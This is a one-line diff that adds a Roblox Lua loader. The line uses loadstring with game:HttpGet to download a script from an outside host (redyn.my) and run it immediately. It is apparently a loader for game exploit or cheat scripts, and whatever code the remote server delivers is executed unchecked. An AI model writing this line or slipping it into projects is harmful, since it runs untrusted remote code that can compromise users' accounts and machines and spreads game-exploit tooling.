@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://redyn.my/Red/Loader/8971a73361.lua"))()
